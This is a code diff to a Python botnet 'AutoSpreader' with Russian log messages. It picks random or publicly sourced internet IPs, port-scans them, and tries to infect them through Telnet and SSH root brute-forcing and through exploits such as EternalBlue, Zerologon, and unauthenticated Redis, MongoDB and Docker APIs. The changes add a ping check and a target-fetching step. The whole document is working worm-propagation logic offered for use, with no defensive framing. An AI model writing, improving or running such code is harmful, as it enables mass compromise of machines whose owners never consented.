@@ -2,7 +2,7 @@ import asyncio, threading, time, json, os, random, ipaddress, socket, struct, qu
 from botnet.spreader import (
     ssh_bruteforce, telnet_bruteforce, exploit_eternalblue, exploit_bluekeep,
     exploit_mikrotik, exploit_zerologon, exploit_redis, exploit_mongodb,
-    exploit_docker_api, init_db, add_bot
+    exploit_docker_api, init_db, add_bot, fetch_public_targets, ping
 )
 from utils.logger import log
 import shodan, censys
@@ -65,25 +65,17 @@ class AutoSpreader:
         self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.thread = threading.Thread(target=self._worker, daemon=True)
         self.thread.start()
-        self.message_queue.put("[System] INFECTION STORM запущен")
+        self.message_queue.put("[System] INFECTION SURGE запущен")
 
     def stop(self):
         self.running = False
         self.save_scanned_ips()
         self.message_queue.put(f"[System] Стоп. Заражено: {self.stats['infected']}")
 
-    def generate_random_ip(self):
-        while True:
-            ip_int = random.randint(0, 2**32 - 1)
-            ip = socket.inet_ntoa(struct.pack('>I', ip_int))
-            if ipaddress.ip_address(ip).is_private: continue
-            if ip.startswith("127.") or ip.startswith("224.") or ip.startswith("225."): continue
-            if ip in self.scanned_ips:
-                continue
-            self.scanned_ips.add(ip)
-            return ip
-
     async def attack_target(self, ip):
+        # Проверяем доступность быстрым пингом
+        if not await ping(ip):
+            return False
         self.message_queue.put(f"[IP] {ip}")
         ports = await ssh_bruteforce.__globals__['quick_port_scan'](
             ip, [22,23,445,3389,8291,6379,27017,2375,2323,2222], timeout=0.4
@@ -92,26 +84,22 @@ class AutoSpreader:
             return False
         self.stats['open_ports'] += 1
         self.message_queue.put(f"[Ports] {ip} открыты: {ports}")
-        # Telnet (все варианты портов)
         for p in [23,2323]:
             if p in ports:
                 if (await telnet_bruteforce(ip, p))[0]:
                     self.stats['infected'] += 1
                     return True
-        # SSH
         for p in [22,2222]:
             if p in ports:
                 if (await ssh_bruteforce(ip, 'root', p))[0]:
                     self.stats['infected'] += 1
                     return True
-        # Сервисы без пароля
         if 6379 in ports and await exploit_redis(ip):
             self.stats['infected'] += 1; return True
         if 27017 in ports and await exploit_mongodb(ip):
             self.stats['infected'] += 1; return True
         if 2375 in ports and await exploit_docker_api(ip):
             self.stats['infected'] += 1; return True
-        # Остальные эксплойты
         if 445 in ports:
             if any(await asyncio.gather(exploit_eternalblue(ip), exploit_zerologon(ip))):
                 self.stats['infected'] += 1; return True
@@ -145,8 +133,19 @@ class AutoSpreader:
                             self.scanned_ips.add(ip)
                 except: pass
             if not target_ips:
-                for _ in range(200):
-                    target_ips.append(self.generate_random_ip())
+                # Пытаемся загрузить публичные цели
+                public = loop.run_until_complete(fetch_public_targets())
+                for ip in public:
+                    if ip not in self.scanned_ips:
+                        target_ips.append(ip)
+                        self.scanned_ips.add(ip)
+                # Если всё равно пусто, генерируем случайные
+                if not target_ips:
+                    for _ in range(200):
+                        ip = str(ipaddress.IPv4Address(random.randint(0x01000000, 0xDFFFFFFF)))
+                        if ip not in self.scanned_ips:
+                            target_ips.append(ip)
+                            self.scanned_ips.add(ip)
             self.stats['scanned'] += len(target_ips)
             self.message_queue.put(f"[Scan] {len(target_ips)} целей")
             sem = asyncio.Semaphore(self.worker_threads)
